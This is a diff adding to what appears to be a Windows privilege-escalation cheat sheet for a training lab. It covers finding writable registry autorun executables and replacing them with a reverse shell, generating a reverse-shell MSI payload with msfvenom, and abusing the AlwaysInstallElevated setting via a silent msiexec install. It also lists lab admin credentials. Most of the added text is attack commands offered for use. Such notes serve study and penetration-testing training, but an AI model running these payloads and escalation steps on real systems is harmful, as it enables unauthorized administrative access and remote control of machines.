@@ -340,9 +340,63 @@ Command-:```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /
 
 `copy [path] [path] /Y`
 
-- Start the service
+- Start the service with `net start filepermsvc
+
+
+### Registry Autoruns
+
+- Query with `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to query the registry for Autorun executables
+
+![image](https://github.com/user-attachments/assets/e1d92284-a179-4105-9407-9a4821568a8d)
+
+- Query with accesschk to see if it is writable by everyone
+
+  Command-: ```C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"```
+
+![image](https://github.com/user-attachments/assets/9d38a137-2369-456b-aeac-99ef3b93ffd4)
+
+- Copy your reverse shell executable to the autorun executable path
+
+- You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves
+
+
+![image](https://github.com/user-attachments/assets/19321af4-8ba3-427d-afba-12c00530e99f)
+
+### Using rdesktop to login to rdp
+
+- Use `rdesktop -u [user] [ip]`
+  
+
+### Generating an msi payload with msfvenom
+
+- Use:
+  
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=[port] -f msi -o saucy.msi
+
+![image](https://github.com/user-attachments/assets/2de086ab-a240-46df-b9b9-55baa9f1bde7)
+
+### Registry AllElevated Keys
+
+-  AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
+When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.
+
+- To check this, use query `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` to check if the value is set to `1` or `0x1`.
+
+![image](https://github.com/user-attachments/assets/e659baaa-85d0-45cf-ae60-a123bd769fa6)
+
+- Copy the msi payload and install with msiexec to trigger a reverse shelll
+
+      msiexec /quiet /qn /i [msi's path]
+
+- Shell
+
+![image](https://github.com/user-attachments/assets/d8b07ea9-8e38-4e1f-a47f-4e2fb3497097)
+
+
 
   
+
+
 
 
 
